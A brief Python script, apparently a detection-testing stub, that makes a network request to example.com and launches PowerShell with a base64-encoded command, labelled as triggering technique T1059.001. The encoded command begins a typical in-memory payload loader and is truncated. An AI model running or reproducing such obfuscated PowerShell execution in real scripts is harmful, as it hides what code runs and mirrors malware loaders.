import os
import urllib.request

# Network connection to trigger IOC
try:
    urllib.request.urlopen("http://example.com")
except:
    pass

# Powershell execution to trigger T1059.001
os.system("powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA... ")
